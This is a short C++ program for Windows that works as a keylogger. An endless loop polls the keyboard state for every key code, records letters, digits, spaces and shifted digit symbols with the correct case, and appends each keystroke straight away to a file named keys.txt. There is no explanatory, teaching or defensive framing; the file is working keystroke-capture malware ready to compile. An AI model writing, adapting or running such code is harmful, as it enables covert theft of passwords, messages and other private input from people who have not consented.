#include <windows.h>
#include <fstream>
#include <iostream>
#include <unordered_map>

int main() {
    // Open the output file and check it opened correctly
    std::ofstream file("keys.txt", std::ios_base::app);
    if (!file.is_open()) {
        std::cerr << "Error: Unable to open output file.\n";
        return 1;
    }

    // Map of ASCII values to their corresponding shifted character
    std::unordered_map<int, char> shiftedKeys = {
        {48, ')'}, {49, '!'}, {50, '@'}, {51, '#'}, {52, '$'},
        {53, '%'}, {54, '^'}, {55, '&'}, {56, '*'}, {57, '('},
        {189, '_'}, {187, '+'}, {219, '{'}, {221, '}'}, {220, '|'},
        {186, ':'}, {222, '\"'}, {188, '<'}, {190, '>'}, {191, '?'}
    };

    // Infinite loop to continuously check for key presses
    while (true) {
        // Brief sleep to reduce CPU usage
        Sleep(10);

        // Iterate over all keys
        for (int i = 8; i <= 255; i++) {
            // If key i was just pressed
            if (GetAsyncKeyState(i) == -32767) {
                // If the key represents a letter, number, or space
                if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57) || i == 32) {
                    // Check if the Shift key is pressed
                    bool isShiftPressed = ((GetKeyState(VK_SHIFT) & 0x8000) != 0);

                    // If key represents a letter and Shift is not pressed
                    if ((i >= 65 && i <= 90) && !isShiftPressed) {
                        // Convert uppercase ASCII value to lowercase by adding 32
                        file << static_cast<char>(i + 32);
                    }
                    // If key represents a letter and Shift is pressed
                    else if ((i >= 65 && i <= 90) && isShiftPressed) {
                        // Write the uppercase letter
                        file << static_cast<char>(i);
                    }
                    // If key represents a number or space and Shift is not pressed
                    else if (!isShiftPressed) {
                        file << static_cast<char>(i);
                    }
                    // If Shift is pressed and the key has a shifted equivalent
                    else if (isShiftPressed && shiftedKeys.count(i) > 0) {
                        // Write the shifted equivalent
                        file << shiftedKeys[i];
                    }

                    // Make sure the character is written to the file immediately
                    file.flush();
                }
            }
        }
    }

    // Close the file before exiting the program
    file.close();

    return 0;
}
